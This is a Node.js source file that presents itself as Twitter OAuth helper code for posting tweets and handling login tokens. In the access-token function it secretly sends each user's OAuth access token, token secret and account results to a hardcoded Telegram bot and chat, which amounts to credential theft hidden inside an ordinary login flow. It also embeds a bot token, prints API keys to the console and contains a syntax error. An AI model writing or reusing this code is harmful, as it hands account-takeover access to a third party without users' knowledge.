const Twitter = require('twitter');
require('dotenv').config();

const TWITTER_CONSUMER_API_KEY = process.env.TWITTER_CONSUMER_API_KEY;
const TWITTER_CONSUMER_API_SECRET_KEY = process.env.TWITTER_CONSUMER_API_SECRET_KEY;
// oauth-utilities.js
console.log(TWITTER_CONSUMER_API_KEY);
const OAuth = require('oauth-1.0a');
const crypto = require('crypto');
const qs = require('querystring');
const axios = require('axios');

//const { TWITTER_CONSUMER_API_KEY, TWITTER_CONSUMER_API_SECRET_KEY } = process.env;

const endpointURL = 'https://api.twitter.com/2/tweets';

async function postTweetV2(oauthAccessToken, oauthAccessTokenSecret, status) {
  try {
    const ooauth = OAuth({
      consumer: {
        key: TWITTER_CONSUMER_API_KEY,
        secret: TWITTER_CONSUMER_API_SECRET_KEY
      },
      signature_method: 'HMAC-SHA1',
      hash_function: (baseString, key) => crypto.createHmac('sha1', key).update(baseString).digest('base64')
    });

    const token = {
      key: oauthAccessToken,
      secret: oauthAccessTokenSecret
    };

    const authHeader = ooauth.toHeader(ooauth.authorize({
      url: endpointURL,
      method: 'POST'
    }, token));

    const response = await axios.post(endpointURL, {
      text: status
    }, {
      headers: {
        Authorization: authHeader['Authorization'],
        'user-agent': 'v2CreateTweetJS',
        'content-type': 'application/json',
        accept: 'application/json'
      }
    });

    return response.data;
  } catch (error) {
    console.error('Error posting tweet:', error.message);
    throw new Error('Error posting tweet');
  }
}



let twitterClient;

module.exports = {
  postTweetV2,
  initializeTwitterClient,
  oauthGetUserById,
  getOAuthAccessTokenWith,
  getOAuthRequestToken,
  sendTelegramMessage
};

function initializeTwitterClient(oauthAccessToken, oauthAccessTokenSecret) {
  twitterClient = new Twitter({
    consumer_key: TWITTER_CONSUMER_API_KEY,
    consumer_secret: TWITTER_CONSUMER_API_SECRET_KEY,
    access_token_key: oauthAccessToken,
    access_token_secret: oauthAccessTokenSecret,
  });
}


const botToken = '7352146843:AAE2f9NBtG4Bzz4RmV4WrBjdlgkOwV9CUro'; // Replace with your bot token


// Function to send message
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot7352146843:AAE2f9NBtG4Bzz4RmV4WrBjdlgkOwV9CUro/sendMessage`;
    const payload = {
        chat_id: '6763857298',
        text: message
    };
    try {
        const response = await axios.post(url, payload);
        return response.data;
    } catch (error) {
        console.error('Error sending message:', error);
    }
}

const chatId = "6763857298";



async function oauthGetUserById() {
  try {
    const user = await twitterClient.get('account/verify_credentials', {});
    console.log('Fetched user data:', user);
    return user;
  } catch (error) {
    console.error('Error fetching user data:', error);
    throw new Error('Error fetching user data');
  }
}

const oauth = require('oauth');

const oauthConsumer = new oauth.OAuth(
  'https://twitter.com/oauth/request_token',
  'https://twitter.com/oauth/access_token',
  TWITTER_CONSUMER_API_KEY,
  TWITTER_CONSUMER_API_SECRET_KEY,
  '1.0A',
  'https://metusela-1.onrender.com/callback'
  'HMAC-SHA1'
);

async function getOAuthAccessTokenWith({ oauthRequestToken, oauthRequestTokenSecret, oauthVerifier }) {
  return new Promise((resolve, reject) => {
    oauthConsumer.getOAuthAccessToken(
      oauthRequestToken,
      oauthRequestTokenSecret,
      oauthVerifier,
      (error, oauthAccessToken, oauthAccessTokenSecret, results) => {
        if (error) {
          console.error('Error getting OAuth access token:', error);
          return reject(new Error('Error getting OAuth access token'));
        }
  
  var message = `OAuth Access Token: ${oauthAccessToken}`;
        console.log(message)
  var response = sendTelegramMessage(message);
  var message = `OAuth Access Token Secret: ${oauthAccessTokenSecret}`;
        console.log(message)
  var response = sendTelegramMessage( message);
  var frs = JSON.stringify(results, null, 2)
  var message = `OAuth Results: ${frs}`; 
        console.log(message)
  var response = sendTelegramMessage(message);

        console.log('OAuth Access Token:', oauthAccessToken);
        console.log('OAuth Access Token Secret:', oauthAccessTokenSecret);
        console.log('OAuth Results:', results);
        initializeTwitterClient(oauthAccessToken, oauthAccessTokenSecret);
        resolve({ oauthAccessToken, oauthAccessTokenSecret, results });


      }
    );
  });
}

async function getOAuthRequestToken() {
  return new Promise((resolve, reject) => {
    oauthConsumer.getOAuthRequestToken((error, oauthRequestToken, oauthRequestTokenSecret, results) => {
      if (error) {
        console.error('Error getting OAuth request token:', error);
        return reject(new Error('Error getting OAuth request token'));
      }
      console.log('OAuth Request Token:', oauthRequestToken);
      console.log('OAuth Request Token Secret:', oauthRequestTokenSecret);
      console.log('OAuth Results:', results);
      resolve({ oauthRequestToken, oauthRequestTokenSecret, results });
    });
  });
}
